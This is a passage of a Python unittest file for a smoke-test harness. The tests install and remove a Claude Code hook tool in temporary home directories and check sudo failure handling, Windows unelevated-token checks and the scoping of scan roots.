            env = smoke.isolated_env(home, os.environ)
            scan_roots = [snapshot.expand_path("~/.claude", self.os_name, env), str(ours_dir)]
            cfg = {
                **self.cfg,
                "os": {
                    **self.cfg["os"],
                    self.os_name.value: {
                        **self.cfg["os"][self.os_name.value],
                        "grdr_search_paths": [str(ours_dir / ("grdr.cmd" if os.name == "nt" else "grdr"))],
                        "protected": {
                            "scan_roots": scan_roots,
                            "ours": [str(ours_dir)],
                        },
                    },
                },
            }
            cell = smoke.CellSpec(
                id="prot-test",
                runner=self.runner,
                profile=snapshot.Profile.PROTECTED,
                build="deploy/build.sh",
                install="install-prot",
                choose="choose-prot",
                uninstall="uninstall-prot",
            )
            hook_bin = ours_dir / "grdr-hook"
            grdr_bin = ours_dir / ("grdr.cmd" if os.name == "nt" else "grdr")
            user_file = home / ".claude" / "settings.json"

            def fake_run(cmd, os_n, prof, run_env, cwd, timeout, *, elevated=False):
                recorded.append((cmd, elevated))
                if cmd == "install-prot":
                    ours_dir.mkdir(parents=True, exist_ok=True)
                    hook_bin.write_text("hook\n", encoding="utf-8")
                    grdr_bin.write_text("grdr\n", encoding="utf-8")
                elif cmd == "choose-prot":
                    e1 = json.dumps({"matcher": "*", "hooks": [{"type": "command", "command": str(hook_bin)}]})
                    updated = SEEDED_BYTES.decode("utf-8").replace("      }\n    ]", f"      }},\n      {e1}\n    ]", 1)
                    user_file.write_bytes(updated.encode("utf-8"))
                elif cmd == "uninstall-prot":
                    user_file.write_bytes(SEEDED_BYTES)
                    for item in (hook_bin, grdr_bin):
                        if item.exists():
                            item.unlink()
                    if ours_dir.exists():
                        ours_dir.rmdir()
                return runner_exec.CommandResult(0, "", "")

            status_json = '{"data":{"agent":"claude-code","state":"effective","installed":true}}'
            with (
                unittest.mock.patch.object(smoke, "run_step_command", side_effect=fake_run),
                unittest.mock.patch.object(smoke, "run_argv", return_value=runner_exec.CommandResult(0, status_json, "")),
            ):
                outcome = smoke.run_r4_cell(cell, cfg, ROOT, env, override_roots=scan_roots)

        self.assertIsInstance(outcome, smoke.CellPassed, outcome.step_log)
        self.assertEqual(
            recorded,
            [
                ("deploy/build.sh", False),
                ("install-prot", True),
                ("install-prot", True),
                ("choose-prot", True),
                ("uninstall-prot", True),
            ],
        )

    def test_posix_sudo_auth_failure_never_masks_step5(self) -> None:
        with (
            unittest.mock.patch.object(runner_exec.shutil, "which", return_value="/usr/bin/sudo"),
            unittest.mock.patch.object(runner_exec.os, "geteuid", return_value=1000, create=True),
            unittest.mock.patch.object(
                runner_exec,
                "run_argv",
                return_value=runner_exec.CommandResult(1, "", "sudo: a password is required\n"),
            ),
        ):
            with self.assertRaises(snapshot.OracleError) as ctx:
                runner_exec._run_posix_elevated(["/bin/true"], {"HOME": "/tmp"}, ROOT, 30)
            self.assertIn(runner_exec.ERR_ELEVATION, str(ctx.exception))

        cell = smoke.CellSpec(
            id="sudo-fail",
            runner="ubuntu-26.04",
            profile=snapshot.Profile.USER,
            build="deploy/build.sh",
            install="install-user",
            choose="choose-user",
            uninstall="uninstall-user",
        )
        with tempfile.TemporaryDirectory() as tmp:
            home = pathlib.Path(tmp) / "home"
            home.mkdir()
            env = smoke.isolated_env(home, os.environ)
            user_roots = [snapshot.expand_path("~/.claude", snapshot.OsName.LINUX, env)]

            def fake_run(cmd, os_n, prof, run_env, cwd, timeout, *, elevated=False):
                if elevated:
                    return runner_exec.CommandResult(1, "", "sudo: a password is required\n")
                return runner_exec.CommandResult(0, "", "")

            with (
                unittest.mock.patch.object(smoke, "run_step_command", side_effect=fake_run),
                unittest.mock.patch.object(smoke, "verify_choose_changes", return_value=[]),
                unittest.mock.patch.object(smoke, "_verify_hook_status", return_value=None),
                unittest.mock.patch.object(
                    smoke,
                    "capture_snapshot",
                    side_effect=lambda cfg, o, p, e=None, override_roots=None: snapshot.capture_snapshot(
                        cfg, o, p, e, override_roots=user_roots
                    ),
                ),
            ):
                outcome = smoke.run_r4_cell(cell, self.cfg, ROOT, env, override_roots=user_roots)
        self.assertIsInstance(outcome, smoke.CellFailed, getattr(outcome, "step_log", outcome))
        self.assertEqual(outcome.failed_step, smoke.StepName.INSTALL_ELEVATED)

    @unittest.skipUnless(os.name == "nt", "Windows-only token test")
    def test_windows_token_helpers_fail_closed_and_verify(self) -> None:
        token = runner_exec._create_unelevated_windows_token()
        try:
            runner_exec._verify_unelevated_windows_token(token)
            with unittest.mock.patch.object(runner_exec._ADVAPI32, "ConvertStringSidToSidW", return_value=0):
                with self.assertRaises(snapshot.OracleError):
                    runner_exec._set_medium_integrity(token)
            with unittest.mock.patch.object(runner_exec._ADVAPI32, "SetTokenInformation", return_value=0):
                with self.assertRaises(snapshot.OracleError):
                    runner_exec._set_medium_integrity(token)
            with unittest.mock.patch.object(runner_exec, "_query_token_integrity_rid", return_value=0x3000):
                with self.assertRaises(snapshot.OracleError):
                    runner_exec._verify_unelevated_windows_token(token)

            def fake_check_member(tok, sid, out_bool):
                ctypes.cast(out_bool, ctypes.POINTER(ctypes.c_long)).contents.value = 1
                return 1

            with unittest.mock.patch.object(runner_exec._ADVAPI32, "CheckTokenMembership", side_effect=fake_check_member):
                with self.assertRaises(snapshot.OracleError):
                    runner_exec._verify_unelevated_windows_token(token)
        finally:
            runner_exec._KERNEL32.CloseHandle(token)

    def test_run_self_test_scopes_to_isolated_roots(self) -> None:
        seen_roots: list[list[str] | None] = []
        orig_run_r4 = smoke.run_r4_cell
        orig_run = smoke.run_step_command

        def local_run(command, os_name, profile, env, cwd, timeout_seconds, *, elevated=False):
            if elevated and ((os.name == "nt" and not runner_exec.is_windows_elevated()) or (os.name != "nt" and os.geteuid() != 0)):
                return runner_exec.CommandResult(1, "", "simulated elevated refusal")
            return orig_run(command, os_name, profile, env, cwd, timeout_seconds, elevated=elevated)

        def recording_r4(cell, cfg, root, env=None, override_roots=None):
            seen_roots.append(override_roots)
            host_cell = smoke.CellSpec(
                id=cell.id,
                runner=self.runner,
                profile=cell.profile,
                build=cell.build,
                install=cell.install,
                choose=cell.choose,
                uninstall=cell.uninstall,
                expected_fail_step=cell.expected_fail_step,
            )
            roots_for_host = override_roots
            if self.os_name == snapshot.OsName.WINDOWS and override_roots is not None:
                roots_for_host = [*override_roots, snapshot.expand_path("%LOCALAPPDATA%", self.os_name, env)]
            return orig_run_r4(host_cell, cfg, root, env, override_roots=roots_for_host)

        with (
            unittest.mock.patch.object(smoke, "run_r4_cell", side_effect=recording_r4),
            unittest.mock.patch.object(smoke, "run_step_command", side_effect=local_run),
        ):
            rc = smoke.run_self_test(self.cfg, HERE / "fixtures" / "cells.toml", ROOT)

        self.assertEqual(rc, 0)
        self.assertEqual(len(seen_roots), 3)
        for roots in seen_roots:
            self.assertIsNotNone(roots)
            assert roots is not None
            self.assertNotIn("/usr", roots)
            self.assertNotIn("/etc", roots)
            self.assertNotIn("/var/lib", roots)


def _make_dir_link(link_path: pathlib.Path, target_path: pathlib.Path) -> None:
    try:
        link_path.symlink_to(target_path, target_is_directory=True)
    except OSError:
        if os.name != "nt":
            raise
        subprocess.run(
            ["cmd", "/c", "mklink", "/J", str(link_path), str(target_path)],
            check=True,
            capture_output=True,
        )


if __name__ == "__main__":
    unittest.main()
